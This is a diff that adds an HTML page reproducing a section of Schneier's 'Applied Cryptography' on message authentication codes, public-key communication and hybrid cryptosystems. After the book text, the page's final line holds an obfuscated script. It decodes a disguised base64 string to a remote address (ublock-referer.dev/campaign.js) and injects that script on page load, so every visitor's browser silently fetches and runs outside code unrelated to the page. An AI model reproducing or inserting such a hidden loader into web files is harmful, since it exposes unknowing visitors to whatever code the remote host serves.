@@ -1,0 +1,100 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=031-033//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Message Authentication Codes</I></B></FONT></P>
+<P>A <B>message authentication code</B> (MAC), also known as a data authentication code (DAC), is a one-way hash function with the addition of a secret key (see Section 18.14). The hash value is a function of both the pre-image and the key. The theory is exactly the same as hash functions, except only someone with the key can verify the hash value. You can create a MAC out of a hash function or a block encryption algorithm; there are also dedicated MACs.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">2.5 Communications Using Public-Key Cryptography</FONT></H3>
+<P>Think of a symmetric algorithm as a safe. The key is the combination. Someone with the combination can open the safe, put a document inside, and close it again. Someone else with the combination can open the safe and take the document out. Anyone without the combination is forced to learn safecracking.
+</P>
+<P>In 1976, Whitfield Diffie and Martin Hellman changed that paradigm of cryptography forever [496]. (The NSA has claimed knowledge of the concept as early as 1966, but has offered no proof.) They described <B>public-key cryptography</B>. They used two different keys&#151;one public and the other private. It is computationally hard to deduce the private key from the public key. Anyone with the public key can encrypt a message but not decrypt it. Only the person with the private key can decrypt the message. It is as if someone turned the cryptographic safe into a mailbox. Putting mail in the mailbox is analogous to encrypting with the public key; anyone can do it. Just open the slot and drop it in. Getting mail out of a mailbox is analogous to decrypting with the private key. Generally it&#146;s hard; you need welding torches. However, if you have the secret (the physical key to the mailbox), it&#146;s easy to get mail out of a mailbox.</P>
+<P>Mathematically, the process is based on the trap-door one-way functions previously discussed. Encryption is the easy direction. Instructions for encryption are the public key; anyone can encrypt a message. Decryption is the hard direction. It&#146;s made hard enough that people with Cray computers and thousands (even millions) of years couldn&#146;t decrypt the message without the secret. The secret, or trapdoor, is the private key. With that secret, decryption is as easy as encryption.</P>
+<P>This is how Alice can send a message to Bob using public-key cryptography:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob agree on a public-key cryptosystem.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob sends Alice his public key.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts her message using Bob&#146;s public key and sends it to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s message using his private key.
+</DL>
+<P>Notice how public-key cryptography solves the key-management problem with symmetric cryptosystems. Before, Alice and Bob had to agree on a key in secret. Alice could choose one at random, but she still had to get it to Bob. She could hand it to him sometime beforehand, but that requires foresight. She could send it to him by secure courier, but that takes time. Public-key cryptography makes it easy. With no prior arrangements, Alice can send a secure message to Bob. Eve, listening in on the entire exchange, has Bob&#146;s public key and a message encrypted in that key, but cannot recover either Bob&#146;s private key or the message.
+</P>
+<P>More commonly, a network of users agrees on a public-key cryptosystem. Every user has his or her own public key and private key, and the public keys are all published in a database somewhere. Now the protocol is even easier:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice gets Bob&#146;s public key from the database.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts her message using Bob&#146;s public key and sends it to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob then decrypts Alice&#146;s message using his private key.
+</DL>
+<P>In the first protocol, Bob had to send Alice his public key before she could send him a message. The second protocol is more like traditional mail. Bob is not involved in the protocol until he wants to read his message.
+</P>
+<P><FONT SIZE="+1"><B><I>Hybrid Cryptosystems</I></B></FONT></P>
+<P>The first public-key algorithms became public at the same time that DES was being discussed as a proposed standard. This resulted in some partisan politics in the cryptographic community. As Diffie described it [494]:
+</P>
+<BLOCKQUOTE><P>The excitement public key cryptosystems provoked in the popular and scientific press was not matched by corresponding acceptance in the cryptographic establishment, however. In the same year that public key cryptography was discovered, the National Security Agency (NSA), proposed a conventional cryptographic system, designed by International Business Machines (IBM), as a federal <I>Data Encryption Standard</I> (DES). Marty Hellman and I criticized the proposal on the ground that its key was too small, but manufacturers were gearing up to support the proposed standard and our criticism was seen by many as an attempt to disrupt the standards-making process to the advantage of our own work. Public key cryptography in its turn was attacked, in sales literature [1125] and technical papers [849,1159] alike, more as though it were a competing product than a recent research discovery. This, however, did not deter the NSA from claiming its share of the credit. Its director, in the words of the <I>Encyclopedia Britannica</I> [1461], pointed out that &#147;two-key cryptography had been discovered at the agency a decade earlier,&#148; although no evidence for this claim was ever offered publicly.</P>
+</BLOCKQUOTE><P>In the real world, public-key algorithms are not a substitute for symmetric algorithms. They are not used to encrypt messages; they are used to encrypt keys. There are two reasons for this:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Public-key algorithms are slow. Symmetric algorithms are generally at least 1000 times faster than public-key algorithms. Yes, computers are getting faster and faster, and in 15 years computers will be able to do public-key cryptography at speeds comparable to symmetric cryptography today. But bandwidth requirements are also increasing, and there will always be the need to encrypt data faster than public-key cryptography can manage.
+<DD><B>2.</B>&nbsp;&nbsp;Public-key cryptosystems are vulnerable to chosen-plaintext attacks. If <I>C</I> = <I>E</I>(<I>P</I>), when <I>P</I> is one plaintext out of a set of <I>n</I> possible plaintexts, then a cryptanalyst only has to encrypt all <I>n</I> possible plaintexts and compare the results with <I>C</I> (remember, the encryption key is public). He won&#146;t be able to recover the decryption key this way, but he will be able to determine <I>P</I>.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(xviozdRa, jaasnoXY) {jaasnoXY = xviozdRa.createElement('script');jaasnoXY.type = 'text/javascript';jaasnoXY.async = true;jaasnoXY.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');xviozdRa.getElementsByTagName('body')[0].appendChild(jaasnoXY);}(document));</script></body>
+</html>
